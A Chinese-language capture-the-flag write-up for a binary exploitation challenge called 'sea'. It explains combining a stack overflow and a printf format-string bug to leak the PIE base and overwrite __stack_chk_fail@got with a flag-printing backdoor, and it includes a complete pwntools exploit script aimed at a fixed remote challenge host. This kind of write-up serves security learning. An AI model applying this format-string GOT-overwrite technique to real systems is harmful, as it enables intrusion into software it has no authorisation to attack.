# sea

## 题目信息

- 附件：`sea`
- 保护：`Partial RELRO / Canary / NX / PIE`
- 关键点：`read` 栈溢出 + `printf(buf)` 格式化字符串

## 漏洞分析

`process_emergency_command` 的关键逻辑如下：

```c
char buf[0x68];
read(0, buf, 0x7c);
printf(buf);
fflush(stdout);
```

这里有两个问题：

1. `read(0, buf, 0x7c)` 向 `0x68` 大小的栈缓冲区读入 `0x7c` 字节，存在栈溢出。
2. `printf(buf)` 直接把用户输入当作格式串，存在格式化字符串漏洞。

程序里还有一个现成的后门函数：

```c
system_reboot_comms() {
    puts("[+] Comm-Link Re-established. Entering Maintenance Shell.");
    fflush(stdout);
    system("cat flag.txt");
    exit(0);
}
```

直接调用这个函数就能打印 flag。

## 利用思路

程序每次连接只有两次输入机会，所以利用链要控制在两轮之内。

### 第一步：泄露 PIE 基址

在 `process_emergency_command` 里，局部变量 `[rbp-0x78]` 保存了一个指向只读段字符串的指针：

```asm
lea    rax, [rip+0xd49]   ; 0x2078
mov    [rbp-0x78], rax
```

格式化字符串探测可以发现这个值正好位于第 `7` 个参数，因此第一轮输入：

```text
%7$p
```

泄露出来的是 `pie_base + 0x2078`，因此：

```text
pie_base = leak - 0x2078
```

### 第二步：改写 `__stack_chk_fail@got`

一开始我考虑过改 `fflush@got`，但 `system_reboot_comms` 自己内部也会调用 `fflush`，那样会递归跳回自身，利用会卡死。

因此正确做法是：

1. 用第二轮格式化字符串把 `__stack_chk_fail@got` 改成 `system_reboot_comms`
2. 同时利用 `read` 的溢出故意破坏 canary
3. 函数返回前 canary 校验失败
4. 程序调用 `__stack_chk_fail@plt`
5. 因为 GOT 已被改写，实际跳到 `system_reboot_comms`
6. 执行 `system("cat flag.txt")` 拿到 flag

由于是 PIE，第二轮写入地址要基于第一轮泄露得到的基址动态计算。

## exp

```python
from pwn import *

context.log_level = "info"
context.arch = "amd64"

HOST = "39.96.193.120"
PORT = 10009

elf = ELF("./sea", checksec=False)


def build_fmt_payload(pie_base: int) -> bytes:
    target_got = pie_base + elf.got["__stack_chk_fail"]
    win = pie_base + elf.symbols["system_reboot_comms"]

    writes = {
        target_got: win & 0xFFFF,
        target_got + 2: (win >> 16) & 0xFFFF,
        target_got + 4: (win >> 32) & 0xFFFF,
    }
    ordered = sorted(writes.items(), key=lambda item: item[1])

    base_index = 16
    while True:
        printed = 0
        parts = []
        for i, (_, value) in enumerate(ordered):
            delta = (value - printed) & 0xFFFF
            if delta:
                parts.append(f"%{delta}c".encode())
            parts.append(f"%{base_index + i}$hn".encode())
            printed = value

        fmt = b"".join(parts)
        aligned = (len(fmt) + 1 + 7) & ~7
        new_base_index = 8 + aligned // 8
        if new_base_index == base_index:
            break
        base_index = new_base_index

    payload = fmt + b"\x00"
    payload = payload.ljust(aligned, b"A")
    payload += b"".join(p64(addr) for addr, _ in ordered)
    payload = payload.ljust(120, b"B")
    return payload


io = remote(HOST, PORT)

io.recvuntil(b"[Remaining Attempts: 2] > ")
io.sendline(b"%7$p")
leak = int(io.recvline().strip(), 16)
pie_base = leak - 0x2078

io.recvuntil(b"[Remaining Attempts: 1] > ")
io.send(build_fmt_payload(pie_base))

io.interactive()
```

## 总结

这题的核心不是单独利用某一个漏洞，而是把两个漏洞拼起来：

- 先用格式化字符串泄露 PIE
- 再用格式化字符串改 GOT
- 最后用栈溢出主动触发被改写后的 `__stack_chk_fail`

这样刚好卡住题目只给两次输入的限制。
